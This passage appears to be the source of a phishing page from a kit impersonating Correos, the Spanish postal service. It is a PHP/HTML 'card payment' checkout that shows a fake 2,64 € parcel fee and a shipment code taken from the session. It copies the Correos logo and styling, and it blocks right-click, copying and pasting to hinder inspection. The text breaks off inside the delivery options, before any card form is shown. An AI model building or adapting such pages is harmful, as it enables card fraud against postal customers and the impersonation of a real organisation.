<?php

include "./inc/app.php";

?>

<html lang="es" oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">
<!--<![endif]-->

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="assets/particulares_fichiers/bootstrap.css" media="screen">
    <link rel="stylesheet" href="assets/particulares_fichiers/validationEngine.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/flaticon.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/fontawesome-all.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/new-style-common-screen.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/common-dynamic.css">
    <link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/fonts/flaticon/flaticon.css?v=2019.12.17">


    <title>página de pago | Pagar con Tarjeta</title>
    <meta name="description" content="En la Tienda Online de Correos tenemos todo para hacer tus envГ­os: cajas, sobres, sellos, embalajes... regalos, coleccionismo y productos solidarios." lang="es">

    <!-- Robots -->


    <meta name="robots" content="index,follow">

    <!-- / Robots -->

    <meta name="expires" content="0">
    <meta name="revisit-after" content="1 days">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="pragma" content="no-cache">
    <style>
        .eR0r {
            border: 2px solid red !important;
        }
    </style>
    <link rel="shortcut icon" href="./assets/Seleccione medio de pago_fichiers/jiconami.ico">
    <link rel="icon" href="./assets/Seleccione medio de pago_fichiers/jiconami.ico" type="image/ico">
    <script>
        const capitalize = (str) => {
            if (typeof str === 'string') {
                return str.replace(/^\w/, c => c.toUpperCase());
            } else {
                return '';
            }
        };

        function allow_alphabets(element) {
            let textInput = element.value;
            textInput = textInput.replace(/[^A-Za-z ]*$/gm, "");
            element.value = capitalize(textInput);
        }
    </script>
</head>

<body class="common-screen-body">


    <!-- Google Tag Manager -->



    <section class="common-screen-header" style="border-top: 6px solid #f3d132;">
        <nav class="navbar navbar-expand-md navbar-light">
            <a class="navbar-brand" href="#">
                <svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" width="239px" height="65px" viewBox="0 0 219.99727 59.833882" version="1.1" id="svg970" inkscape:version="0.92.2 (5c3e80d, 2017-08-06)" sodipodi:docname="Correos.svg">
                    <defs id="defs964" />
                    <sodipodi:namedview id="base" pagecolor="#ffffff" bordercolor="#666666" borderopacity="1.0" inkscape:pageopacity="0.0" inkscape:pageshadow="2" inkscape:zoom="0.70910507" inkscape:cx="367.70716" inkscape:cy="-87.838609" inkscape:document-units="mm" inkscape:current-layer="layer1" showgrid="false" fit-margin-top="0" fit-margin-left="0" fit-margin-right="0" fit-margin-bottom="0" inkscape:measure-start="686.781,423.068" inkscape:measure-end="829.214,441.401" inkscape:window-width="1366" inkscape:window-height="705" inkscape:window-x="-8" inkscape:window-y="-8" inkscape:window-maximized="1" />
                    <metadata id="metadata967">
                        <rdf:RDF>
                            <cc:Work rdf:about="">
                                <dc:format>image/svg+xml</dc:format>
                                <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
                                <dc:title></dc:title>
                            </cc:Work>
                        </rdf:RDF>
                    </metadata>
                    <g inkscape:label="Capa 1" inkscape:groupmode="layer" id="layer1" transform="translate(-22.745446,-140.77167)">
                        <path inkscape:connector-curvature="0" id="path849" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 48.868944,185.64791 c 0,2.06276 1.67115,3.7408 3.73113,3.7408 2.05999,0 3.73252,-1.67804 3.73252,-3.7408 0,-2.0655 -1.67253,-3.74081 -3.73252,-3.74081 -2.05998,0 -3.73113,1.67531 -3.73113,3.74081 m 25.91942,-11.21961 c -1.02723,7.46227 -5.84352,13.71395 -12.43851,16.7391 -2.74251,1.25749 -5.79113,1.95935 -9.00244,1.95935 h -0.74734 c -4.12272,0 -7.46365,-3.34785 -7.46365,-7.47884 0,-4.131 3.34093,-7.47884 7.46365,-7.47884 4.12136,0 7.46366,3.34784 7.46366,7.47884 0,0.92108 -0.16685,1.80214 -0.4688,2.61843 1.50293,-0.56259 2.9121,-1.32096 4.19443,-2.24337 0,0 0.005,-0.24976 0.005,-0.37522 0,-6.19653 -5.01208,-11.21964 -11.1948,-11.21964 -6.18271,0 -11.19617,5.02311 -11.19617,11.21964 0,6.19372 5.01346,11.21824 11.19617,11.21824 4.5874,0 8.89765,-1.18581 12.64534,-3.2651 7.00312,-3.88972 12.03313,-10.90939 13.21342,-19.17278 z m -37.1156,0 H 26.742699 c 1.178907,8.26336 6.210295,15.28306 13.212045,19.17275 -1.44641,-2.30267 -2.28198,-5.03137 -2.28198,-7.95314 z m 44.78333,-3.74081 c 0,16.52402 -13.36648,29.91806 -29.85602,29.91806 -16.48816,0 -29.854628,-13.39404 -29.854628,-29.91806 h 18.658458 v 5.06447 c 2.737,-3.10376 6.73839,-5.06447 11.19617,-5.06447 7.25821,0 13.30718,5.19134 14.65017,12.06901 2.45848,-3.02934 3.95314,-6.87767 4.00967,-11.07624 v -0.99277 z" />
                        <path inkscape:connector-curvature="0" id="path853" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 52.600774,158.93523 h -1.86695 v -6.9452 c -2.05999,0 -3.73114,1.6739 -3.73114,3.7408 0,1.35954 0.72389,2.55086 1.80904,3.2044 h -4.82318 c -0.46054,-0.97208 -0.71838,-2.05858 -0.71838,-3.2044 0,-1.31541 0.33918,-2.55085 0.93348,-3.62359 -0.2992,-0.0758 -0.61083,-0.11725 -0.93348,-0.11725 -2.05999,0 -3.73114,1.6739 -3.73114,3.7408 0,1.35954 0.72527,2.55086 1.80904,3.2044 h -4.82318 c -0.46054,-0.97208 -0.71838,-2.05857 -0.71838,-3.2044 0,-4.13099 3.34231,-7.4802 7.46366,-7.4802 1.35954,0 2.63496,0.36388 3.73252,0.99964 1.09756,-0.63564 2.37298,-0.99964 3.73114,-0.99964 0.64529,0 1.27129,0.0813 1.86695,0.23568 0.59566,-0.15439 1.22027,-0.23568 1.86419,-0.23568 1.36091,0 2.63496,0.36388 3.73252,0.99964 1.09893,-0.63564 2.37298,-0.99964 3.7339,-0.99964 4.11997,0 7.46365,3.34921 7.46365,7.4802 0,1.14583 -0.25921,2.23232 -0.71837,3.2044 h -4.82318 c 1.08376,-0.65354 1.80903,-1.84486 1.80903,-3.2044 0,-2.0669 -1.67115,-3.7408 -3.73113,-3.7408 -0.32265,0 -0.63427,0.0414 -0.93486,0.11725 0.59566,1.07274 0.93486,2.30818 0.93486,3.62359 0,1.14582 -0.25922,2.23232 -0.71976,3.2044 h -4.8218 c 1.08239,-0.65354 1.80766,-1.84486 1.80766,-3.2044 0,-2.0669 -1.66978,-3.7408 -3.73252,-3.7408 v 6.9452 z" />
                        <path inkscape:connector-curvature="0" id="path857" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 36.525564,162.1958 c 0,-1.2465 1.00931,-2.25854 2.25578,-2.25854 1.24372,0 2.25303,1.01204 2.25303,2.25854 0,1.2492 -1.00931,2.25991 -2.25303,2.25991 -1.24647,0 -2.25578,-1.01071 -2.25578,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path861" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 64.165784,162.1958 c 0,-1.2465 1.01069,-2.25854 2.2544,-2.25854 1.24647,0 2.25578,1.01204 2.25578,2.25854 0,1.2492 -1.00931,2.25991 -2.25578,2.25991 -1.24371,0 -2.2544,-1.01071 -2.2544,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path865" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 57.255594,162.1958 c 0,-1.2465 1.01069,-2.25854 2.25578,-2.25854 1.2451,0 2.25441,1.01204 2.25441,2.25854 0,1.2492 -1.00931,2.25991 -2.25441,2.25991 -1.24509,0 -2.25578,-1.01071 -2.25578,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path869" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 50.346374,162.1958 c 0,-1.2465 1.0093,-2.25854 2.25578,-2.25854 1.24371,0 2.25302,1.01204 2.25302,2.25854 0,1.2492 -1.00931,2.25991 -2.25302,2.25991 -1.24648,0 -2.25578,-1.01071 -2.25578,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path873" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 43.436034,162.1958 c 0,-1.2465 1.00931,-2.25854 2.2544,-2.25854 1.24509,0 2.25441,1.01204 2.25441,2.25854 0,1.2492 -1.00932,2.25991 -2.25441,2.25991 -1.24509,0 -2.2544,-1.01071 -2.2544,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path875" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 41.404044,165.70327 h 22.39235 v 3.74081 h -22.39235 z" />
                        <path inkscape:connector-curvature="0" id="path887" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 51.979054,144.14844 v -0.8852 h -1.24509 v -1.2451 h 1.24509 v -1.24647 h 1.24371 v 1.24647 h 1.24371 v 1.2451 h -1.24371 v 0.8852 c 0.72389,0.25796 1.24371,0.95 1.24371,1.76352 0,1.03275 -0.83419,1.87109 -1.86556,1.87109 -1.03138,0 -1.86695,-0.83834 -1.86695,-1.87109 0,-0.81352 0.51982,-1.50568 1.24509,-1.76352" />
                        <path inkscape:connector-curvature="0" id="path891" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 118.56896,184.56106 c -3.41923,2.04324 -7.57663,3.64954 -10.86396,3.807 -3.54914,0.1752 -7.45261,-0.45644 -8.549039,-4.00978 -1.612174,-5.22625 1.602329,-11.88954 5.789249,-14.11976 5.79713,-3.0905 10.61199,-1.41731 12.26354,0.27954 l 1.20864,-6.23811 c -2.45271,-1.08462 -5.81485,-1.54323 -7.06877,-1.54323 -8.74981,0 -12.958396,4.26763 -15.588264,7.80891 -2.952699,3.98415 -6.893567,14.01744 0.433057,20.9523 2.184994,2.06887 6.173107,3.33656 9.952557,3.07475 5.96248,-0.41737 9.61399,-2.11606 13.09817,-4.62785 0.1732,0.37775 0.37403,0.73225 0.60235,1.06101 1.52359,2.19486 4.30306,3.29522 8.32069,3.29522 6.68296,0 11.09232,-2.62005 12.44072,-10.16715 l 0.42915,-2.51173 c 0.0491,-0.23826 0.0965,-0.51167 0.13776,-0.80512 0.10822,-0.7539 0.17913,-1.63185 0.17913,-2.34836 0,-5.69871 -3.48222,-8.17896 -9.66715,-8.17896 -6.61207,0 -10.91317,2.58656 -12.40724,10.1297 3.62788,-2.37397 7.18097,-4.81685 11.80291,-4.81685 2.56098,0 3.3405,1.02753 3.3405,2.93892 0,0.624 -0.0313,1.28149 -0.20473,2.27555 -0.0156,0.0809 -0.0274,0.15735 -0.0435,0.23992 l -0.46258,2.47832 c -0.8169,4.03534 -1.91924,5.45262 -5.04714,5.45262 -2.37987,0 -3.26962,-0.81293 -3.26962,-2.86801 -0.0351,-0.71261 0.12006,-2.08069 0.21063,-2.58461 0.0925,-0.50218 0.72441,-3.4448 0.72441,-3.4448 0,0 -4.31094,2.4094 -7.76165,4.47039" />
                        <path inkscape:connector-curvature="0" id="path895" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 159.88922,170.35564 c -2.48027,0 -5.42509,0.38556 -8.01166,2.47039 l 0.31889,-1.87006 h -6.45264 l -4.04125,22.74369 h 6.98214 l 2.94287,-16.49179 c 1.87988,-0.56693 4.71644,-1.0256 7.2341,-1.0256 z" />
                        <path inkscape:connector-curvature="0" id="path899" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 176.08949,170.35564 c -2.4783,0 -5.38769,0.38556 -8.01166,2.47039 l 0.35432,-1.87006 h -6.45065 l -4.04126,22.74369 h 6.98215 l 2.94285,-16.49179 c 1.87988,-0.56693 4.71447,-1.0256 7.23215,-1.0256 z" />
                        <path inkscape:connector-curvature="0" id="path903" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 234.73105,175.01769 c 1.73619,0 4.46645,0.17521 7.30302,0.45868 l 0.70864,-4.20268 c -1.73618,-0.46034 -4.71644,-0.91728 -8.15535,-0.91728 -5.31683,0 -10.45846,1.12792 -10.45846,7.13374 0,3.32077 1.87989,5.29907 5.35423,6.6711 l 1.70272,0.67323 c 2.44483,1.02558 2.97829,1.3779 2.97829,2.47239 0,1.94091 -1.80903,2.33067 -4.04323,2.33067 -3.36607,0 -4.7125,-0.28179 -7.69276,-0.41905 l -0.71062,4.16328 c 1.20864,0.35432 4.82471,0.8819 8.01559,0.8819 6.4861,0 11.41513,-1.93896 11.41513,-7.87385 0,-3.17909 -1.59642,-4.94481 -5.56485,-6.49992 l -1.91728,-0.74012 c -1.87792,-0.7756 -2.62199,-1.16731 -2.62199,-2.11807 0,-1.94292 2.01964,-2.01379 3.68692,-2.01379" />
                        <path inkscape:connector-curvature="0" id="path907" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 214.20272,181.09259 -0.49605,2.47045 c -0.77951,4.02745 -1.87988,5.43883 -4.99793,5.43883 -2.37594,0 -3.29916,-0.81293 -3.29916,-2.86014 0,-0.7756 0.0374,-1.58854 0.24804,-2.57869 l 0.498,-2.47045 c 0.74212,-4.02746 1.91334,-5.43884 4.96251,-5.43884 2.55506,0 3.29914,1.02358 3.29914,2.93102 0,0.67125 0,1.37594 -0.21455,2.50782 m -2.48224,-10.73601 c -6.62977,0 -10.91907,2.57479 -12.37179,10.10019 l -0.46062,2.18893 c -0.28346,1.37796 -0.28346,2.43697 -0.28346,3.49603 0,5.43885 3.29522,8.15927 9.56871,8.15927 6.70263,0 11.10017,-2.61412 12.4466,-10.13958 l 0.42519,-2.50386 c 0.14177,-0.84843 0.31889,-2.15546 0.31889,-3.14562 0,-5.68491 -3.47434,-8.15536 -9.64352,-8.15536" />
                        <path inkscape:connector-curvature="0" id="path911" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 190.12996,180.41938 h -8.18881 l 0.10636,-0.31695 c 0.42519,-2.47434 1.45272,-4.80306 4.85816,-4.80306 2.69484,0 3.47041,1.34253 3.47041,3.03541 0,0.5312 -0.10436,1.24209 -0.24608,2.0846 m -2.58852,-10.06476 c -6.62784,0 -11.34426,2.75385 -12.6907,10.73797 l -0.17717,1.20075 c -0.24998,1.376 -0.42517,2.68303 -0.42517,3.81491 0,5.75382 3.5078,8.19079 10.06672,8.19079 4.0767,0 7.37584,-0.56496 9.25572,-0.98624 l 0.74213,-4.59237 c -4.28731,0.28123 -6.27546,0.39171 -8.64943,0.39171 -3.68694,0 -4.67905,-0.92124 -4.67905,-2.75787 0,-0.49381 0.10635,-1.13182 0.28151,-2.15546 h 14.99772 c 0.46063,-2.32867 0.67323,-3.91725 0.67323,-5.50971 0,-4.94479 -2.6968,-8.33448 -9.39548,-8.33448" />
                    </g>
                </svg>
            </a>

            <button style="display:none;cursor:none;" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#common-screen-top-navbar" aria-controls="common-screen-top-navbar" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="common-screen-top-navbar">
                <div style="display:none" class="navbar-nav ml-auto">
                    <a class="nav-item nav-link" href="#">Entrar</a>
                    <a class="nav-item nav-link" href="#">Registro</a>
                    <a class="nav-item nav-link" href="#">Cesta de la compra</a>
                </div>
            </div>
        </nav>
    </section>

    <section class="common-screen-content">
        <section class="go-back-to-shop">
            <div class="container">
                <ul class="nav">
                    <li class="nav-item">
                        <a class="nav-link" href="#" style="cursor:none;"></a>
                    </li>
                </ul>
            </div>
        </section>

        <section class="checkout-template">
            <div class="container">
                <div class="cart-no-product-alert" style="display:none">No tienes productos en tu cesta</div>
                <!--null-->

                <div class="alert alert-danger alert-error alert-dismissable shopping-cart-alert" style="display:none">
                    <button type="button" class="close" data-dismiss="alert">X</button>
                    <strong>.</strong>
                </div>
                <!-- Mobile version Summary of the cart -->
                <div class="checkout-mobile-summary">
                    <div class="checkout-summary-fixed d-block d-lg-none">
                        <div class="row" style="display:none;">

                        </div>
                        <!-- summary checkout mobile -->
                        <div class="summary-checkout">
                            <div class="summary-product-thumbs row" style="display:none;">
                            </div>
                            <div class="row">
                                <div class="col">
                                    <span>Total</span>
                                </div>
                                <div class="col text-right">
                                    <span>2,64 €</span>
                                </div>
                            </div>
                        </div>
                        <!-- /summary checkout mobile -->
                    </div>
                </div>
                <!-- Mobile version Summary of the cart -->

                <div class="row flex-column-reverse flex-lg-row">
                    <div class="col-lg-7">
                        <div class="checkout-left-side">
                            <div id="cartParent" style="opacity: 1;">
                                <div id="shippingZoneLocked" class="shopping-cart-locked-parent" style="display: block;">
                                </div>
                                <div id="shippingZoneForm" class="shopping-cart-form-parent" style="display: none;">
                                </div>

                                <div id="carrierLocked" class="shopping-cart-locked-parent" style="display: block;">
                                    <section class="checkout-small-shipping-type small-box">
                                        <div class="small-box-content">
                                            <div class="title">
                                                <div class="title-content">
                                                    <div class="title-icon">
                                                        <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 496.246 496.246" style="enable-background:new 0 0 496.246 496.246;" xml:space="preserve">
                                                            <path style="fill:#1A3D5B;" d="M471.135,68.332H250.778v6.451c0-15.328-12.446,12.69-27.758,12.69H93.468
	c-15.321,0-27.75,12.43-27.75,27.75L4.427,321.118c0,15.344,12.414,27.758,27.758,27.758h140.753h50.089h248.115
	c6.845,0,12.383-5.537,12.383-12.367V80.699C483.525,73.862,477.98,68.332,471.135,68.332z" />
                                                            <path style="fill:#0A2438;" d="M18.188,274.857L4.419,321.119c0,15.344,12.414,27.758,27.758,27.758H172.93h50.089h248.115
	c6.845,0,12.383-5.537,12.383-12.367v-61.653H18.188z" />
                                                            <path style="fill:#528099;" d="M153.624,114.475H65.788c0,0.252-0.063,0.496-0.063,0.756l-26.734,89.773
	c1.434,0.221,2.867,0.457,4.372,0.457h110.269c15.328,0,27.758-12.43,27.758-27.758v-35.47
	C181.382,126.889,168.952,114.475,153.624,114.475z" />
                                                            <path style="fill:#C1E5F4;" d="M54.91,282.199c0,14.249-3.269,25.813-7.326,25.813c-4.033,0-7.318-11.571-7.318-25.813
	c0-14.281,3.285-25.836,7.318-25.836C51.641,256.362,54.91,267.918,54.91,282.199z" />
                                                            <path style="fill:#D9F5FF;" d="M47.584,308.019c-4.033,0-7.318-11.571-7.318-25.813c0-14.281,3.285-25.836,7.318-25.836" />
                                                            <g>
                                                                <path style="fill:#1D5777;" d="M108.19,205.462l71.719-71.719c-2.576-7.971-8.554-14.336-16.321-17.337l-89.049,89.056H108.19z" />
                                                                <path style="fill:#1D5777;" d="M125.424,205.462h28.199c15.328,0,27.758-12.43,27.758-27.758v-28.199L125.424,205.462z" />
                                                                <path style="fill:#1D5777;" d="M93.538,114.475h-27.75c0,0.252-0.063,0.496-0.063,0.756L54.24,153.765L93.538,114.475z" />
                                                            </g>
                                                            <path style="fill:#FFA522;" d="M496.246,359.944c0,5.711-4.632,10.342-10.342,10.342H10.335C4.608,370.294,0,365.655,0,359.944
	V324.34c0-5.727,4.608-10.342,10.335-10.342h475.569c5.711,0,10.342,4.624,10.342,10.342V359.944z" />
                                                            <g>
                                                                <path style="fill:#FFC41F;" d="M485.904,313.998H10.335C4.608,313.998,0,318.622,0,324.348v7.845
		c0,5.711,4.608,10.335,10.335,10.335h475.569c5.711,0,10.342-4.632,10.342-10.335v-7.845
		C496.246,318.622,491.615,313.998,485.904,313.998z" />
                                                                <path style="fill:#FFC41F;" d="M135.467,376.596c0,19.259-15.644,34.895-34.911,34.895s-34.895-15.628-34.895-34.895
		c0-19.291,15.628-34.926,34.895-34.926S135.467,357.297,135.467,376.596z" />
                                                            </g>
                                                            <path style="fill:#FFA522;" d="M100.557,341.669c19.267,0,34.911,15.628,34.911,34.926c0,19.259-15.644,34.895-34.911,34.895" />
                                                            <path style="fill:#1A3D5B;" d="M100.557,427.914c-28.302,0-51.326-23.032-51.326-51.326c0-28.325,23.016-51.342,51.326-51.342
	s51.326,23.016,51.326,51.342C151.883,404.882,128.859,427.914,100.557,427.914z M100.557,358.101
	c-10.193,0-18.479,8.302-18.479,18.495c0,10.177,8.287,18.464,18.479,18.464s18.495-8.287,18.495-18.464
	C119.052,366.403,110.75,358.101,100.557,358.101z" />
                                                            <circle style="fill:#FFC41F;" cx="402.038" cy="376.58" r="34.903" />
                                                            <path style="fill:#FFA522;" d="M377.336,351.894c13.627-13.619,35.738-13.619,49.357,0c13.643,13.627,13.627,35.738,0,49.373" />
                                                            <path style="fill:#1A3D5B;" d="M438.319,412.877c-20.023,20.023-52.578,20.023-72.602,0c-20.023-20.023-20.023-52.571,0-72.586
	c20.023-20.039,52.578-20.039,72.602,0C458.327,360.306,458.327,392.854,438.319,412.877z M388.962,363.504
	c-7.223,7.207-7.223,18.928,0,26.136c7.192,7.207,18.913,7.207,26.12,0c7.2-7.207,7.2-18.928,0-26.136
	C407.883,356.313,396.154,356.313,388.962,363.504z" />
                                                            <g>
                                                                <path style="fill:#FFC41F;" d="M303.206,239.293h-37.053c23.182-22.481,40.669-41.913,40.669-66.19
		c0-20.385-13.257-40.952-42.803-40.952c-13.989,0-27.38,4.813-37.715,13.556c-2.206,1.89-2.922,5.002-1.733,7.656l5.104,11.311
		c0.835,1.843,2.505,3.198,4.49,3.671c1.961,0.473,4.057-0.047,5.616-1.355c3.797-3.174,11.603-8.523,20.953-8.523
		c11.453,0,17.006,5.451,17.006,16.581c-0.15,15.006-12.524,29.168-42.134,57.344l-12.564,12.209
		c-1.26,1.213-1.969,2.907-1.969,4.671v9.838c0,3.592,2.907,6.498,6.514,6.498h75.618c3.616,0,6.514-2.907,6.514-6.498v-13.304
		C309.713,242.2,306.822,239.293,303.206,239.293z" />
                                                                <path style="fill:#FFC41F;" d="M404.362,207.762h-10.075v-67.104c0-3.592-2.922-6.498-6.514-6.498h-17.321
		c-2.111,0-4.12,1.048-5.341,2.773l-52.838,75.634c-0.764,1.095-1.174,2.379-1.174,3.718v10.571c0,3.584,2.907,6.491,6.506,6.491
		h48.514v25.765c0,3.592,2.922,6.498,6.522,6.498h15.132c3.592,0,6.514-2.907,6.514-6.498v-25.765h10.075
		c3.584,0,6.491-2.907,6.491-6.491v-12.572C410.852,210.668,407.946,207.762,404.362,207.762z M346.262,207.762l19.858-27.672
		v27.672H346.262z" />
                                                            </g>
                                                            <g>
                                                                <path style="fill:#FFA522;" d="M309.713,259.104v-13.304c0-3.592-2.891-6.498-6.514-6.498h-24.773h-12.28
		c23.182-22.481,40.669-41.913,40.669-66.19c0-18.897-11.422-37.935-36.659-40.598c-11.729,1.189-22.764,5.75-31.579,13.202
		c-2.206,1.89-2.922,5.002-1.733,7.656l5.104,11.311c0.079,0.158,0.244,0.244,0.323,0.41c4.246-3.04,10.815-6.617,18.464-6.617
		c2.363,0,4.411,0.284,6.262,0.756c1.914-0.457,3.931-0.756,6.018-0.756c11.453,0,17.006,5.451,17.006,16.581
		c-0.142,15.006-12.516,29.168-42.134,57.344l-12.564,12.209c-1.268,1.213-1.977,2.907-1.977,4.671v9.838
		c0,3.592,2.907,6.498,6.514,6.498h63.338C306.822,265.602,309.713,262.695,309.713,259.104z" />
                                                                <path style="fill:#FFA522;" d="M394.287,259.104v-25.765h81.967c3.592,0,6.498-2.907,6.498-6.491v-12.572
		c0-3.608-2.907-6.514-6.498-6.514h-81.967v-67.104c0-3.592-2.922-6.498-6.514-6.498h-5.041c-2.111,0-4.12,1.048-5.341,2.773
		l-52.831,75.634c-0.772,1.095-1.182,2.379-1.182,3.718v10.571c0,3.584,2.907,6.491,6.506,6.491h36.234h12.28v25.765
		c0,3.592,2.922,6.498,6.522,6.498h2.851C391.365,265.602,394.287,262.695,394.287,259.104z M378.407,207.762h-12.28h-7.578h-12.28
		l19.858-27.672v17.101l12.28-17.101V207.762z" />
                                                                <path style="fill:#FFA522;" d="M483.037,186.25c0,1.875-1.512,3.395-3.395,3.395h-72.208c-1.875,0-3.395-1.512-3.395-3.395l0,0
		c0-1.859,1.512-3.395,3.395-3.395h72.208C481.524,182.855,483.037,184.383,483.037,186.25L483.037,186.25z" />
                                                                <path style="fill:#FFA522;" d="M483.037,167.834c0,1.875-1.512,3.395-3.395,3.395h-72.208c-1.875,0-3.395-1.512-3.395-3.395l0,0
		c0-1.859,1.512-3.395,3.395-3.395h72.208C481.524,164.439,483.037,165.967,483.037,167.834L483.037,167.834z" />
                                                                <path style="fill:#FFA522;" d="M483.037,149.417c0,1.875-1.512,3.395-3.395,3.395h-72.208c-1.875,0-3.395-1.512-3.395-3.395l0,0
		c0-1.859,1.512-3.395,3.395-3.395h72.208C481.524,146.022,483.037,147.551,483.037,149.417L483.037,149.417z" />
                                                            </g>

                                                        </svg>

                                                    </div>
                                                    <div class="title-text">
                                                        <h4>Código de envío : ES/<?php echo $_SESSION["Package"] ?></h4>
                                                        <p>Paquete Premium</p>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="buttons">

                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div id="carrierFormParent" class="shopping-cart-form-parent" style="display: none;">
                                    <section class="checkout-shipping-type">
                                        <div class="checkout-box">
                                            <div class="checkout-box-title">
                                                <div class="checkout-box-title-icon"><img style="width: 45px;height: auto;" src="/assets/particulares_fichiers/delivery-truck.png" alt="" srcset=""></div>
                                                <h4>Código de envío : ES/<?php echo $_SESSION["Package"] ?></h4>
                                            </div>
                                            <div class="checkout-box-content">
                                                <div class="checkout-shipping-type-content">
                                                    <input type="hidden" name="carrierid" id="carrierid" value="3">
                                                    <input type="hidden" name="isselfpick" id="isselfpick" value="0">
                                                    <input type="hidden" name="selfpickstorecode" id="selfpickstorecode" value="">
                                                    <input type="hidden" name="homepaqtoken" id="homepaqtoken" value="">
                                                    <!--  NEW SCREEN BEGIN -->
                                                    <div class="checkout-shipping-type-zones">
                                                        <div class="checkout-shipping-type-zones-image">
                                                            <img class="img-responsive" alt="Paq EstГЎndar" src="#">
                                                        </div>

                                                        <div class="custom-control custom-checkbox form-check office-delivery">
                                                            <input type="checkbox" id="carrierselection3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="0">
                                                            <label class="custom-control-label" for="carrierselection3">A tu domicilio <strong>(2,64 €)</strong></label>
                                                        </div>

                                                        <div class="custom-control custom-checkbox form-check office-nodelivery-container">
                                                            <input type="checkbox" id="carrierselection_self3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="1" data-postalcode="39999" data-is-pickup-at-shop="0">

                                                            <label class="custom-control-label" for="carrierselection_self3">Recogida en oficina de Correos <strong>(2,64 €)</strong></label>

                                                            <!-- Correos hidden offices -->

                                                            <div class="offices-search-container" style="display:none">
                                                                <!-- <div class="custom-control custom-checkbox form-check">
                                                                    <input type="checkbox" class="custom-control-input" id="Office1">
                                                                    <label class="custom-control-label" for="Office1">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
                                                                </div>
                                                                <div class="custom-control custom-checkbox form-check">
                                                                    <input type="checkbox" class="custom-control-input" id="Office2">
                                                                    <label class="custom-control-label" for="Office2">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
                                                                </div> -->
                                                            </div>
                                                            <!-- /Correos hidden offices -->
                                                        </div>
                                                    </div>
                                                    <div style="width:100%">
                                                        <small class="text-muted">
                                                            <p>Tus envГ­os en un mГЎximo de 72 horas</p>
                                                        </small>
                                                    </div>
                                                    <!--  NEW SCREEN END -->


                                                    <!--  NEW SCREEN BEGIN -->
                                                    <div class="checkout-shipping-type-zones type-city">
                                                        <div class="checkout-shipping-type-zones-image">
                                                            <img class="img-responsive" alt="Paq EstГЎndar CityPaq" src="#">
                                                        </div>
                                                        <div class="custom-control custom-checkbox form-check office-delivery">
                                                            <input type="checkbox" id="carrierselection9" class="custom-control-input carrierselection" data-carrier="9" data-homepaq="1" data-selfpick="1">
                                                            <label class="custom-control-label" for="carrierselection9">EnvГ­o mediante CityPaq <strong>(2,64 €)</strong></label>

                                                            <div class="cityPaq-search-container" style="display:none;">
                                                                <p>Indique su nombre de usuario CityPaq:</p>
                                                                <div class="input-group">
                                                                    <input class="form-control py-2 homepaqusername validate[required]" type="search" name="homepaqusername9" id="homepaqusername9">
                                                                    <span class="input-group-append">
                                                                        <input type="button" class="btn btn-outline-secondary searchhomepaq" value="Buscar" data-val="homepaqusername9" data-target="homepaqresult9"></span>
                                                                </div>

                                                                <div id="homepaqresult9" class="homepaqresultdiv">
                                                                    <p class="citypaq-text">
